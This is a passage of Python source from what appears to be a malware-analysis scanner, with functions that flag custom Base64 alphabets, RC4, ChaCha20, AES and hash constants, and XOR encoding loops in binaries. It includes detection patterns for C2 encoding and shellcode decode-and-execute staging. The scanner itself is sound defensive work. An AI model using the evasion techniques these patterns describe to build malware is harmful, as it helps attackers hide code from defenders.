    b64_cand_re = re.compile(rb'[\x21-\x7E]{64,66}')
    for b64_m in b64_cand_re.finditer(binary_data):
        candidate = b64_m.group(0)[:64]
        candidate_set = set(candidate)
        if len(candidate_set) == 64:
            overlap = len(candidate_set & std_b64)
            if overlap < 50:
                snippet = candidate[:16].decode("ascii", errors="replace")
                findings.append({
                    "severity": "HIGH",
                    "title": "CUSTOM_BASE64_ALPHABET",
                    "detail": (
                        f"Non-standard 64-char lookup table at offset "
                        f"{b64_m.start():#010x} "
                        f"({overlap}/64 chars overlap std B64): "
                        f"{snippet!r}... — C2 encoding evasion via custom "
                        "Base64 alphabet"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
                break  # one report per binary

    return findings


def detect_rc4_usage_in_binary(binary_data: bytes) -> list:
    """
    Detect RC4 and modern stream cipher usage patterns in binary data.

    Techniques from PMA ch.13 (common cryptographic algorithms): RC4 carries
    no cryptographic magic constants (unlike AES S-boxes or DES permutation
    tables), so FindCrypt2/KANAL miss it.  Detection relies on structural
    bytecode signals — the 256-element S-box size constant, mod-256 index
    masking in PRGA, adjacent key material, and the explicit sigma/tau
    constants that ChaCha20/Salsa20 embed.

      - RC4 KSA: loop bound 0x100 (256) in CMP/MOV instructions signals the
        256-element S-box initialization loop.
      - RC4 PRGA: AND reg, 0xFF (mod-256 masking) within 512 bytes of the KSA
        constant indicates the keystream generation phase.
      - Hardcoded key: printable ASCII string 4-32 bytes long adjacent to the
        KSA pattern is likely the encryption key and can be extracted directly.
      - ChaCha20/Salsa20: sigma "expand 32-byte k" and tau "expand 16-byte k"
        are 16-byte literal constants embedded in any implementation.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    if not binary_data:
        return findings

    # ── 1. RC4 KSA constant: 0x100 (256) as S-box initialization loop bound ─
    # RC4 KSA iterates i from 0 to 255, resulting in a CMP/MOV with 256 (0x100).
    # In x86 little-endian:
    #   3D 00 01 00 00 = CMP EAX, 100h
    #   81 F9 00 01 00 00 = CMP ECX, 100h  (ECX is the canonical loop counter)
    #   B9 00 01 00 00 = MOV ECX, 100h     (loop initialization)
    ksa_re = re.compile(
        rb'(?:'
        rb'\x3D\x00\x01\x00\x00'               # CMP EAX, 256
        rb'|\x81[\xF8-\xFF]\x00\x01\x00\x00'   # CMP r32, 256
        rb'|\xB9\x00\x01\x00\x00'              # MOV ECX, 256
        rb'|\xBB\x00\x01\x00\x00'              # MOV EBX, 256
        rb')'
    )
    ksa_m = ksa_re.search(binary_data)
    if ksa_m:
        findings.append({
            "severity": "MEDIUM",
            "title": "RC4_KSA_CONSTANT",
            "detail": (
                f"0x100 (256) S-box size constant at offset "
                f"{ksa_m.start():#010x} — matches RC4 Key Scheduling "
                "Algorithm loop bound; RC4 has no cryptographic magic "
                "constants so FindCrypt2/KANAL will not flag it"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. RC4 PRGA pattern: AND reg, 0xFF (mod-256 index masking) ───────────
    # PRGA computes j = (j + S[i]) % 256; the mod-256 is compiled as AND
    # reg, 0xFF.  Presence of this mask within 512 bytes of the KSA constant
    # strongly indicates PRGA keystream generation.
    #   83 E? FF = AND r32, 0xFF (short-form sign-extend mask)
    #   25 FF 00 00 00 = AND EAX, 0xFF (long-form)
    prga_re = re.compile(
        rb'(?:\x83[\xE0-\xE7]\xFF|\x25\xFF\x00\x00\x00)'
    )
    if ksa_m:
        ksa_off = ksa_m.start()
        win_start = max(0, ksa_off - 512)
        win_end = min(len(binary_data), ksa_off + 512)
        prga_window = binary_data[win_start:win_end]
        pm = prga_re.search(prga_window)
        if pm:
            abs_prga_off = win_start + pm.start()
            findings.append({
                "severity": "HIGH",
                "title": "RC4_PRGA_PATTERN",
                "detail": (
                    f"AND 0xFF (mod-256 masking) at offset "
                    f"{abs_prga_off:#010x}, within 512 bytes of RC4 KSA "
                    f"constant at {ksa_m.start():#010x} — matches RC4 "
                    "Pseudo-Random Generation Algorithm keystream loop"
                ),
                "host": "localhost",
                "port": 0,
            })

    # ── 3. Hardcoded RC4 key: printable string adjacent to KSA constant ──────
    # When the RC4 key is a hardcoded literal (length 4-32 bytes) embedded
    # adjacent to the KSA routine, it can be extracted directly from the binary
    # and used to decrypt captured traffic or embedded payloads.
    if ksa_m:
        ksa_off = ksa_m.start()
        win_start = max(0, ksa_off - 256)
        win_end = min(len(binary_data), ksa_off + 256)
        window = binary_data[win_start:win_end]
        key_re = re.compile(rb'[\x20-\x7E]{4,32}')
        for km in key_re.finditer(window):
            candidate = km.group(0)
            # Require at least 4 distinct characters to exclude padding runs
            if len(set(candidate)) >= 4:
                findings.append({
                    "severity": "HIGH",
                    "title": "HARDCODED_RC4_KEY",
                    "detail": (
                        f"Printable string {candidate[:32]!r} "
                        f"({len(candidate)} bytes) within 256 bytes of RC4 "
                        "KSA constant — extractable decryption key"
                    ),
                    "host": "localhost",
                    "port": 0,
                })
                break  # first candidate only

    # ── 4. ChaCha20 / Salsa20 sigma/tau constants ─────────────────────────────
    # ChaCha20 and Salsa20 embed a 16-byte ASCII constant in the state matrix:
    #   sigma "expand 32-byte k" (256-bit key): 65 78 70 61 6e 64 20 33
    #                                            32 2d 62 79 74 65 20 6b
    #   tau   "expand 16-byte k" (128-bit key): 65 78 70 61 6e 64 20 31
    #                                            36 2d 62 79 74 65 20 6b
    # Unlike RC4, these constants survive into compiled code unaltered and are
    # detectable via literal byte search.
    chacha20_sigma = (
        b"\x65\x78\x70\x61\x6e\x64\x20\x33"
        b"\x32\x2d\x62\x79\x74\x65\x20\x6b"
    )  # "expand 32-byte k"
    salsa20_tau = (
        b"\x65\x78\x70\x61\x6e\x64\x20\x31"
        b"\x36\x2d\x62\x79\x74\x65\x20\x6b"
    )  # "expand 16-byte k"

    sigma_idx = binary_data.find(chacha20_sigma)
    if sigma_idx != -1:
        findings.append({
            "severity": "MEDIUM",
            "title": "CHACHA20_INDICATOR",
            "detail": (
                f"ChaCha20 sigma constant 'expand 32-byte k' at offset "
                f"{sigma_idx:#010x} — modern stream cipher; "
                "key material may still be hardcoded or weakly derived"
            ),
            "host": "localhost",
            "port": 0,
        })
    else:
        tau_idx = binary_data.find(salsa20_tau)
        if tau_idx != -1:
            findings.append({
                "severity": "MEDIUM",
                "title": "CHACHA20_INDICATOR",
                "detail": (
                    f"Salsa20 tau constant 'expand 16-byte k' at offset "
                    f"{tau_idx:#010x} — modern stream cipher detected"
                ),
                "host": "localhost",
                "port": 0,
            })

    return findings


def detect_base64_c2_encoding(binary_data: bytes) -> list:
    """Detect Base64 encoding patterns used for C2 communication.

    Four signals grounded in PMA ch.13 (Data Encoding / Base64 section):
    1. Standard MIME Base64 alphabet string present with encode/decode proximity.
    2. Modified (non-standard) Base64 indexing string — custom substitution cipher.
    3. Base64 decode call co-present with VirtualAlloc — shellcode staging pattern.
    4. URL-safe Base64 chars (- and _) in encoded string context — web C2 paths.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    STANDARD_ALPHABET = (
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    )

    # ── 1. Standard MIME Base64 alphabet + encode/decode proximity ────────────
    # PMA ch.13: "code that contains Base64 encoding will often have this
    # telltale string of 64 characters."  Co-location with an encode/decode
    # reference (string import or CryptoAPI) confirms active use, not just
    # incidental presence.
    std_idx = binary_data.find(STANDARD_ALPHABET)
    if std_idx != -1:
        win_start = max(0, std_idx - 1024)
        win_end = min(len(binary_data), std_idx + len(STANDARD_ALPHABET) + 1024)
        window = binary_data[win_start:win_end]
        codec_re = re.compile(
            rb"(?i)base64|encod|decod|crypt32|Base64Decode|Base64Encode"
        )
        proximity_note = (
            "with encode/decode reference in proximity — "
            if codec_re.search(window)
            else "— "
        )
        findings.append({
            "severity": "MEDIUM",
            "title": "BASE64_ENCODING_PRESENT",
            "detail": (
                f"Standard MIME Base64 alphabet at offset {std_idx:#010x} "
                f"{proximity_note}common C2 encoding"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. Custom / modified Base64 indexing string ───────────────────────────
    # PMA ch.13: "The only item that needs to be changed is the indexing string
    # ... difficult to decode without knowledge of this string."  Any 64-byte
    # run of printable chars with ≥60 distinct values that is NOT the standard
    # alphabet is a candidate custom substitution cipher.
    custom_b64_re = re.compile(rb"[ -~]{64}")  # printable ASCII, exactly 64 chars
    for m in custom_b64_re.finditer(binary_data):
        candidate = m.group(0)
        if candidate == STANDARD_ALPHABET:
            continue
        if len(set(candidate)) < 60:
            continue
        findings.append({
            "severity": "HIGH",
            "title": "CUSTOM_BASE64_ALPHABET",
            "detail": (
                f"Non-standard 64-unique-char Base64 indexing string at offset "
                f"{m.start():#010x}: {candidate[:32]!r}... — "
                "anti-analysis encoding variant; standard decoders will fail"
            ),
            "host": "localhost",
            "port": 0,
        })
        break  # first candidate only

    # ── 3. Base64 decode + VirtualAlloc — shellcode decode-and-execute ────────
    # PMA ch.13 + ch.12 covert launching: decode Base64 payload into a
    # freshly allocated RWX region then execute.  All three markers must be
    # present in the same binary: a Base64 table, a decode reference, and a
    # memory-allocation call.
    has_b64_table = (
        std_idx != -1
        or binary_data.find(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmno") != -1
    )
    has_decode_ref = bool(
        re.search(rb"(?i)base64decode|CryptStringToBinary", binary_data)
    )
    has_alloc = bool(
        re.search(rb"VirtualAlloc|NtAllocateVirtualMemory|HeapAlloc", binary_data)
    )
    if has_b64_table and (has_decode_ref or std_idx != -1) and has_alloc:
        findings.append({
            "severity": "CRITICAL",
            "title": "BASE64_DECODE_TO_EXEC",
            "detail": (
                "Base64 alphabet table + decode reference + VirtualAlloc all "
                "present — shellcode decode-and-execute staging pattern; "
                "PMA ch.13 custom-encoding + ch.12 process injection chain"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 4. URL-safe Base64 chars (- and _) in encoded string context ──────────
    # PMA ch.13: malware Base64-encodes C2 identifiers into cookie/URL path
    # fields (e.g., bot ID in Cookie header).  The URL-safe variant substitutes
    # + → - and / → _ to survive HTTP transport without percent-encoding.
    urlsafe_re = re.compile(rb"[A-Za-z0-9\-_]{20,}={0,2}")
    for m in urlsafe_re.finditer(binary_data):
        candidate = m.group(0)
        if b"-" not in candidate and b"_" not in candidate:
            continue
        # Reject if immediately bounded by NUL (struct padding, not a string)
        start, end = m.start(), m.end()
        if start > 0 and binary_data[start - 1] == 0:
            continue
        if end < len(binary_data) and binary_data[end] == 0:
            continue
        findings.append({
            "severity": "MEDIUM",
            "title": "URL_SAFE_BASE64",
            "detail": (
                f"URL-safe Base64 pattern (- / _ chars) at offset "
                f"{start:#010x}: {candidate[:32]!r} — "
                "web C2 encoding; matches PMA ch.13 malware GET/Cookie example"
            ),
            "host": "localhost",
            "port": 0,
        })
        break  # first candidate only

    return findings


def detect_salsa20_chacha20_usage(binary_data: bytes) -> list:
    """Detect Salsa20 and ChaCha20 stream cipher constants in binary data.

    Four signals from PMA ch.13 (Common Cryptographic Algorithms — magic
    constants as fingerprint targets):
    1. 'expand 32-byte k' sigma constant — ChaCha20 / Salsa20-256.
    2. 'expand 16-byte k' tau constant — Salsa20-128.
    3. ChaCha20 SIGMA first word 0x61707865 ('expa' LE) as 4-byte DWORD.
    4. 12-byte (96-bit) nonce candidate adjacent to 32-byte key material.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # ── 1. ChaCha20 / Salsa20-256 sigma constant "expand 32-byte k" ──────────
    # PMA ch.13: "most cryptographic algorithms employ some type of magic
    # constant."  Both ChaCha20 and Salsa20 embed the 16-byte ASCII sigma
    # string directly in state matrix initialisation.  It survives into
    # compiled binaries unaltered — detectable via literal byte search.
    # Ransomware families (Ryuk, BlackMatter, LockBit derivatives) and C2
    # frameworks that encrypt channel traffic routinely use ChaCha20.
    CHACHA20_SIGMA = b"expand 32-byte k"
    sigma_idx = binary_data.find(CHACHA20_SIGMA)
    if sigma_idx != -1:
        findings.append({
            "severity": "CRITICAL",
            "title": "CHACHA20_CONSTANT",
            "detail": (
                f"ChaCha20/Salsa20-256 sigma constant 'expand 32-byte k' at "
                f"offset {sigma_idx:#010x} — stream cipher common in "
                "ransomware file encryption and C2 channel encryption; "
                "PMA ch.13 cryptographic-constant fingerprint"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. Salsa20-128 tau constant "expand 16-byte k" ───────────────────────
    # The tau constant indicates a 128-bit key schedule, weaker than the
    # 256-bit sigma variant.
    SALSA20_TAU = b"expand 16-byte k"
    tau_idx = binary_data.find(SALSA20_TAU)
    if tau_idx != -1:
        findings.append({
            "severity": "CRITICAL",
            "title": "SALSA20_CONSTANT",
            "detail": (
                f"Salsa20-128 tau constant 'expand 16-byte k' at offset "
                f"{tau_idx:#010x} — Salsa20 stream cipher with 128-bit key; "
                "weaker key schedule than the 256-bit sigma variant"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 3. ChaCha20 SIGMA first word 0x61707865 ('expa' LE) ──────────────────
    # The 16-byte sigma constant is processed by ChaCha20's core as four
    # little-endian 32-bit words.  The first word ('expa') is 0x61707865.
    # Compilers loading the constant word-by-word produce this 4-byte pattern
    # without emitting the full ASCII string as a contiguous literal, evading
    # naive string searches.  Only reported when the full sigma string is absent
    # to avoid duplicating the finding.
    CHACHA_SIGMA_WORD = struct.pack("<I", 0x61707865)  # b'\x65\x78\x70\x61'
    if sigma_idx == -1:
        word_idx = binary_data.find(CHACHA_SIGMA_WORD)
        if word_idx != -1:
            findings.append({
                "severity": "CRITICAL",
                "title": "CHACHA_SIGMA",
                "detail": (
                    f"ChaCha20 SIGMA first word 0x61707865 ('expa' LE) at offset "
                    f"{word_idx:#010x} — ChaCha20 quarter-round constant; "
                    "full sigma loaded word-by-word to evade contiguous string search"
                ),
                "host": "localhost",
                "port": 0,
            })

    # ── 4. 12-byte nonce adjacent to 32-byte high-entropy key block ───────────
    # ChaCha20 (RFC 7539) specifies a 96-bit (12-byte) nonce alongside a
    # 256-bit (32-byte) key.  A 12-byte non-NUL run with ≥8 distinct byte
    # values within 64 bytes of a 32-byte block with ≥20 distinct values is a
    # structural marker of ChaCha20 key setup.
    # Scan is capped at the first 4 MB to keep runtime bounded on large binaries.
    SCAN_LIMIT = 4 * 1024 * 1024
    KEY_LEN = 32
    NONCE_LEN = 12
    KEY_DISTINCT_MIN = 20
    NONCE_DISTINCT_MIN = 8
    PROXIMITY = 64
    STEP = 16

    scan_end = min(len(binary_data), SCAN_LIMIT)
    nonce_found = False
    for key_off in range(0, scan_end - KEY_LEN - NONCE_LEN, STEP):
        key_block = binary_data[key_off: key_off + KEY_LEN]
        if len(set(key_block)) < KEY_DISTINCT_MIN:
            continue
        search_start = max(0, key_off - PROXIMITY)
        search_end = min(scan_end - NONCE_LEN, key_off + KEY_LEN + PROXIMITY)
        for n_off in range(search_start, search_end):
            if n_off >= key_off and n_off < key_off + KEY_LEN:
                continue  # skip overlap with key block
            nonce_cand = binary_data[n_off: n_off + NONCE_LEN]
            if 0 in nonce_cand:
                continue
            if len(set(nonce_cand)) < NONCE_DISTINCT_MIN:
                continue
            findings.append({
                "severity": "HIGH",
                "title": "CHACHA20_NONCE_SIZE",
                "detail": (
                    f"12-byte (96-bit) nonce candidate at offset {n_off:#010x} "
                    f"within {PROXIMITY} bytes of 32-byte high-entropy key block "
                    f"at {key_off:#010x} — nonce size matches ChaCha20 spec "
                    "(RFC 7539); structural marker of ChaCha20 key setup"
                ),
                "host": "localhost",
                "port": 0,
            })
            nonce_found = True
            break
        if nonce_found:
            break

    return findings


def detect_aes_usage_in_binary(binary_data: bytes) -> list:
    """
    Detect AES usage patterns in binary data via cryptographic constant search.

    Techniques from PMA ch.13 (common cryptographic algorithms): AES embeds
    magic constants — forward S-box, inverse S-box, and Rcon table — that
    survive compilation and are identifiable with FindCrypt2, KANAL, or a raw
    byte search.  Unlike RC4, AES cannot hide its constants; the S-box alone
    uniquely identifies the cipher.

      - Forward S-box first row (0x63..0xc5): an 8-byte literal sequence
        unique to AES; presence confirms statically linked AES encryption.
      - Rcon table: the key schedule embeds Rcon[0..2] = {0x01000000,
        0x02000000, 0x04000000}; stored as LE 32-bit integers, the 12-byte
        run is unambiguous and confirms key expansion logic.
      - Inverse S-box first 7 bytes (0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36,
        0xa5): distinct from the forward S-box; confirms AES decryption
        capability, indicating ciphertext is being processed inbound.
      - 256-byte block starting with 0x63 and >=200 distinct values:
        structurally consistent with a complete AES S-box lookup table
        embedded in read-only data.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    if not binary_data:
        return findings

    # ── 1. AES forward S-box first-row marker (8-byte sequence) ─────────────
    # The AES S-box is a 256-byte constant lookup table; its first row begins
    # with bytes 0x63 0x7c 0x77 0x7b 0xf2 0x6b 0x6f 0xc5.  This 8-byte
    # sequence is unique enough that a single match in any binary confirms
    # statically linked AES encryption (FindCrypt2 and KANAL flag this same
    # constant).
    SBOX_MARKER = bytes([0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5])
    sbox_off = binary_data.find(SBOX_MARKER)
    if sbox_off != -1:
        findings.append({
            "severity": "CRITICAL",
            "title": "AES_SBOX_DETECTED",
            "detail": (
                f"AES forward S-box first-row marker "
                f"(63 7c 77 7b f2 6b 6f c5) at offset {sbox_off:#010x} — "
                "AES substitution box present in binary; confirms statically "
                "linked AES encryption capability (detectable by "
                "FindCrypt2/KANAL per PMA ch.13)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. AES key schedule Rcon table (first 3 LE-packed entries) ───────────
    # AES key expansion uses a round-constant (Rcon) array.  Rcon[0..2] =
    # {0x01000000, 0x02000000, 0x04000000}.  Packed as little-endian 32-bit
    # integers and stored consecutively, the resulting 12-byte sequence is a
    # reliable marker for AES key schedule logic in any AES-128/192/256 impl.
    rcon_seq = struct.pack("<III", 0x01000000, 0x02000000, 0x04000000)
    rcon_off = binary_data.find(rcon_seq)
    if rcon_off != -1:
        findings.append({
            "severity": "CRITICAL",
            "title": "AES_RCON_CONSTANT",
            "detail": (
                f"AES key schedule Rcon table (entries 01000000 02000000 "
                f"04000000 in LE) at offset {rcon_off:#010x} — round-constant "
                "table confirms AES key expansion; key schedule implementation "
                "present (AES-128/192/256 all share this Rcon sequence)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 3. AES inverse S-box first 7 bytes ───────────────────────────────────
    # The AES inverse S-box is used during decryption (InvSubBytes).  Its
    # first 7 bytes are 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5 — distinct
    # from the forward S-box.  Presence indicates the binary contains AES
    # decryption logic; combined with the forward S-box it implies full
    # encrypt/decrypt capability (data is being decrypted in-process).
    INV_SBOX_MARKER = bytes([0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5])
    inv_off = binary_data.find(INV_SBOX_MARKER)
    if inv_off != -1:
        findings.append({
            "severity": "CRITICAL",
            "title": "AES_INVERSE_SBOX",
            "detail": (
                f"AES inverse S-box marker (52 09 6a d5 30 36 a5) at "
                f"offset {inv_off:#010x} — AES decryption S-box (InvSubBytes) "
                "present in binary; confirms data is being decrypted (AES "
                "decryption S-box distinct from forward S-box)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 4. 256-byte block starting with 0x63 (complete S-box candidate) ──────
    # A 256-byte block whose first byte is 0x63 and that contains >=200
    # distinct byte values is structurally consistent with a complete AES
    # S-box embedded in read-only data.  Only triggered when the 8-byte
    # forward S-box marker was not found (avoids double-reporting the same
    # table).  Scan is capped at the first 4 MB to bound runtime on large
    # binaries; stride of 16 bytes aligns to common data-section alignment.
    if sbox_off == -1:
        BLOCK_LEN = 256
        SCAN_CAP = 4 * 1024 * 1024
        scan_end = min(len(binary_data), SCAN_CAP)
        for off in range(0, scan_end - BLOCK_LEN, 16):
            if binary_data[off] == 0x63:
                block = binary_data[off: off + BLOCK_LEN]
                distinct = len(set(block))
                if distinct >= 200:
                    findings.append({
                        "severity": "HIGH",
                        "title": "AES_256_BYTE_BLOCK",
                        "detail": (
                            f"256-byte block at offset {off:#010x} begins "
                            f"with 0x63 and contains {distinct} distinct byte "
                            "values — consistent with AES S-box (256-byte "
                            "block consistent with AES S-box lookup table in "
                            "read-only data section)"
                        ),
                        "host": "localhost",
                        "port": 0,
                    })
                    break  # one report is sufficient

    return findings


def detect_hash_misuse_indicators(binary_data: bytes) -> list:
    """
    Detect hash algorithm implementation constants in binary data.

    Techniques from PMA ch.1 (hashing as malware fingerprint) and ch.13
    (cryptographic algorithm recognition): hash algorithms embed fixed
    initialization vectors and, for CRC32, a precomputed lookup table.
    These constants survive compilation and uniquely identify the algorithm.

      - MD5 (RFC 1321): four 32-bit init values {0x67452301, 0xEFCDAB89,
        0x98BADCFE, 0x10325476} stored consecutively in LE; MD5 is
        collision-vulnerable (Wang et al. 2004) and deprecated for integrity.
      - SHA-1 (FIPS 180-4): five 32-bit init values — same first four as MD5
        plus 0xC3D2E1F0; SHA-1 is collision-broken (SHAttered 2017) and
        deprecated by NIST for digital signatures.
      - SHA-256 (FIPS 180-4): first two of eight 32-bit init values
        {0x6a09e667, 0xbb67ae85}; current standard but implementation
        noted for audit completeness.
      - CRC32 (ISO 3309): precomputed table; entries 0 and 1 are
        {0x00000000, 0x77073096}; CRC32 provides error detection only —
        not cryptographic — but is misused as an integrity check in malware.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    if not binary_data:
        return findings

    # ── 1. SHA-1 initialization constants (5 LE-packed 32-bit values) ────────
    # SHA-1 uses five 32-bit initial hash values.  Packed consecutively as
    # LE integers they form a 20-byte sequence.  Checked before MD5 because
    # SHA-1's first four values are identical to MD5's four; detecting the
    # fifth (0xC3D2E1F0) disambiguates.  SHA-1 is broken (SHAttered 2017) and
    # should not appear in new code — presence in malware typically indicates
    # certificate or code-signature verification bypass logic.
    sha1_seq = struct.pack(
        "<IIIII",
        0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0,
    )
    sha1_off = binary_data.find(sha1_seq)
    if sha1_off != -1:
        findings.append({
            "severity": "HIGH",
            "title": "SHA1_CONSTANTS",
            "detail": (
                f"SHA-1 initialization vector (all 5 LE values "
                f"67452301 EFCDAB89 98BADCFE 10325476 C3D2E1F0) at "
                f"offset {sha1_off:#010x} — SHA-1 implementation in binary; "
                "SHA-1 is collision-broken (SHAttered 2017) and deprecated "
                "by NIST; presence may indicate signature-verification logic"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. MD5 initialization constants (4 LE-packed 32-bit values) ──────────
    # MD5 uses four 32-bit initial state values stored consecutively in LE.
    # A match that does NOT overlap with the SHA-1 sequence above is reported
    # separately; a match that does overlap is the SHA-1 case already captured.
    # MD5 is collision-vulnerable (Wang et al. 2004); it should not be used
    # for integrity or authentication — common malware use: payload hash check.
    md5_seq = struct.pack(
        "<IIII",
        0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476,
    )
    md5_off = binary_data.find(md5_seq)
    # Report MD5 only when not already covered by the SHA-1 finding at the same offset
    if md5_off != -1 and md5_off != sha1_off:
        findings.append({
            "severity": "HIGH",
            "title": "MD5_CONSTANTS",
            "detail": (
                f"MD5 initialization constants (67452301 EFCDAB89 "
                f"98BADCFE 10325476 in LE) at offset {md5_off:#010x} — "
                "MD5 implementation in binary; MD5 is collision-vulnerable "
                "(Wang et al. 2004) and deprecated for cryptographic use; "
                "commonly used in malware for payload integrity checks"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 3. SHA-256 first two initialization constants (LE-packed) ────────────
    # SHA-256 uses eight 32-bit init values derived from the fractional parts
    # of square roots of the first 8 primes.  The first two {0x6a09e667,
    # 0xbb67ae85} together form a distinctive 8-byte sequence unlikely to
    # appear by chance.  SHA-256 is current standard; presence is noted for
    # completeness and to identify the hash algorithm in use.
    sha256_seq = struct.pack("<II", 0x6A09E667, 0xBB67AE85)
    sha256_off = binary_data.find(sha256_seq)
    if sha256_off != -1:
        findings.append({
            "severity": "HIGH",
            "title": "SHA256_CONSTANTS",
            "detail": (
                f"SHA-256 initialization values (6a09e667 bb67ae85 in LE) "
                f"at offset {sha256_off:#010x} — SHA-256 implementation in "
                "binary; current standard hash (FIPS 180-4); presence "
                "identifies hash algorithm and may indicate HMAC, signature "
                "verification, or content-addressable storage logic"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 4. CRC32 precomputed table (first two LE-packed entries) ─────────────
    # CRC32 (ISO 3309 / ITU-T V.42) uses a 256-entry precomputed polynomial
    # table.  Entry 0 is always 0x00000000; entry 1 is 0x77073096 (polynomial
    # 0xEDB88320 reflected).  The 8-byte pair is a reliable marker for a
    # statically embedded CRC32 table.  CRC32 provides error detection only —
    # not cryptographic integrity — but is misused in malware as an integrity
    # check, file-format identification, or anti-tamper mechanism.
    crc32_seq = struct.pack("<II", 0x00000000, 0x77073096)
    crc32_off = binary_data.find(crc32_seq)
    if crc32_off != -1:
        findings.append({
            "severity": "MEDIUM",
            "title": "CRC32_TABLE",
            "detail": (
                f"CRC32 precomputed table marker (00000000 77073096 in LE) "
                f"at offset {crc32_off:#010x} — CRC32 lookup table embedded "
                "in binary; CRC32 provides integrity check only, not "
                "cryptographic security; misuse as authentication check is "
                "a vulnerability"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings


def detect_rolling_xor_encoding(binary_data: bytes) -> list:
    """
    Detect rolling and cascade XOR encoding patterns in binary data.

    Techniques from PMA ch.13 (simple ciphers, Table 13-4, custom encoding):

      - Rolling XOR loop: XOR byte opcode (0x30/0x32/0x34) within an 8-byte
        window of INC r32 (0x40-0x47) — the loop counter doubles as the key
        byte, so the effective key increments with every encoded byte. Defeats
        single-byte brute-force analysis because there is no fixed key value.
        PMA ch.13 identifies XOR loops by "small loops with XOR in the middle";
        the INC co-located with the XOR body is the rolling-key discriminator.
      - Cascade (loopback) XOR: MOV r8,[reg+disp8=-1] (8A ?? FF) adjacent to
        XOR opcode — loads the prior ciphertext byte as the next XOR key.
        PMA Table 13-4 calls this the "chained or loopback" encoding scheme.
      - Two-byte XOR key: XOR AL,K1 / XOR AL,K2 alternating pattern with two
        distinct non-zero immediate bytes — PMA "multibyte" scheme (4- or
        8-byte key; two-byte is the minimal period). Evades single-byte
        brute-force because no single key decodes the full stream correctly.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    if not binary_data:
        return findings

    # ── 1. Rolling XOR loop (XOR byte opcode + INC in 8-byte window) ─────────
    # x86 byte XOR opcodes: 0x30 (XOR r/m8,r8), 0x32 (XOR r8,r/m8),
    # 0x34 (XOR AL,imm8). INC r32: 0x40 (EAX) through 0x47 (EDI).
    # In a rolling-key loop the counter register serves as both the index into
    # the buffer and the XOR key — INC appears in the same 8-byte loop body as
    # the XOR instruction. First hit only; no need to enumerate all occurrences.
    xor_byte_re = re.compile(rb'[\x30\x32\x34]')
    inc_r32_re = re.compile(rb'[\x40-\x47]')

    rolling_hit = None
    for xm in xor_byte_re.finditer(binary_data):
        region_start = max(0, xm.start() - 8)
        region_end = min(len(binary_data), xm.end() + 8)
        if inc_r32_re.search(binary_data[region_start:region_end]):
            rolling_hit = xm.start()
            break

    if rolling_hit is not None:
        findings.append({
            "severity": "HIGH",
            "title": "ROLLING_XOR_ENCODE",
            "detail": (
                f"Rolling XOR encoding loop at offset {rolling_hit:#010x} — "
                "XOR byte opcode (0x30/0x32/0x34) within 8 bytes of INC r32 "
                "(0x40-0x47); loop counter used as key increments per encoded "
                "byte, defeating single-byte brute-force (PMA ch.13)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 2. Cascade (loopback) XOR: MOV r8,[reg-1] near XOR opcode ────────────
    # MOV r8, [r32+disp8] encodes as 8A <ModRM> <disp8>. ModRM 0x40-0x7F
    # selects [reg+disp8] addressing mode (mod=01); disp8=-1 is 0xFF.
    # The pattern 8A [0x40-0x7F] FF loads the byte one position before the
    # current pointer — i.e., the previously written ciphertext byte — into
    # an 8-bit register to use as the XOR key for the next iteration.
    cascade_mov_re = re.compile(rb'\x8A[\x40-\x7F]\xFF')
    cascade_xor_re = re.compile(rb'[\x30\x32\x34]')

    cascade_hit = None
    for cm in cascade_mov_re.finditer(binary_data):
        region_start = max(0, cm.start() - 16)
        region_end = min(len(binary_data), cm.end() + 16)
        if cascade_xor_re.search(binary_data[region_start:region_end]):
            cascade_hit = cm.start()
            break

    if cascade_hit is not None:
        findings.append({
            "severity": "HIGH",
            "title": "CASCADE_XOR_ENCODE",
            "detail": (
                f"Cascading XOR pattern at offset {cascade_hit:#010x} — "
                "MOV r8,[reg-1] (8A ?? FF) adjacent to XOR byte opcode; "
                "prior ciphertext byte used as next XOR key (PMA ch.13 "
                "Table 13-4 'chained or loopback' encoding scheme)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # ── 3. Two-byte XOR key: alternating XOR AL,K1 / XOR AL,K2 ──────────────
    # XOR AL,imm8 opcode is 0x34. A two-byte key encoding unrolls as
    # 34 K1 34 K2 34 K1 34 K2 ... (K1 != K2, both nonzero). Require the
    # alternating pair to repeat at least once (four 0x34 bytes total) with
    # the same K1,K2 order to distinguish from coincidental adjacent XORs.
    two_byte_re = re.compile(
        rb'\x34([\x01-\xFF])\x34([\x01-\xFF])(?:\x34\1\x34\2)+'
    )
    tbm = two_byte_re.search(binary_data)
    if tbm:
        k1 = tbm.group(1)[0]
        k2 = tbm.group(2)[0]
        if k1 != k2:
            findings.append({
                "severity": "MEDIUM",
                "title": "XORSHIFT_TWO_BYTE",
                "detail": (
                    f"Two-byte XOR key encoding at offset {tbm.start():#010x} — "
